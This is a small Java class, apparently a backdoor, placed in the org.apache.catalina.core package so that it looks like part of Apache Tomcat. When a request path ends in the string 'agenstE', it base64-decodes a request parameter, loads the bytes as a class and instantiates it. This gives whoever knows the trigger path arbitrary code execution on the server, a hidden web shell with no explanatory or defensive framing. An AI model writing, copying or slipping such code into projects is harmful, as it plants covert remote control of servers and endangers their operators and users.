package org.apache.catalina.core;

import org.apache.catalina.core.utils.Util;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class ExtendServices {
    //我总觉得有个接口更好 鉴定为java写多了
    public static String SERVICE_URL="agenstE";

    public static void doServices(java.util.Map rdd,Object obj) throws IOException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException, ClassNotFoundException {
        if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.ExtendServices.SERVICE_URL)) {
            System.out.println("hello?");
            byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b"));
            Class clz= Util.abstractClassLoader(data);
            clz.newInstance();
        }
    }

}
